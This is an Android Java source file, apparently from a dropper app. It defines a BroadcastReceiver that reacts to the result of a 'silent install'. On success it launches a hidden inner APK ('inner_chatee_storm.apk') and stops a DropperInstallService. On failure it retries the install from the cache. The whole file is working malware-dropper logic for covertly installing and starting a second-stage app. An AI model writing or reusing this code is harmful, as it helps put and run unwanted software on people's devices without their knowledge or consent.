package com.pkg.loader.dispatch;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;

import com.pkg.loader.dispatch.internal.ApkInstaller;

import java.io.File;

/** Launches inner Chatee after silent install completes. */
public class InstallResultReceiver extends BroadcastReceiver {
    public static final String ACTION = "com.pkg.loader.dispatch.INSTALL_DONE";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) {
            return;
        }
        int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE);
        if (status == PackageInstaller.STATUS_SUCCESS
            || ApkInstaller.isInnerInstalled(context)) {
            ApkInstaller.launchInner(context);
            context.stopService(new Intent(context, DropperInstallService.class));
            return;
        }
        File cache = new File(context.getCacheDir(), "inner_chatee_storm.apk");
        if (cache.exists()) {
            ApkInstaller.installWithViewer(context, cache.getAbsolutePath());
        }
    }
}
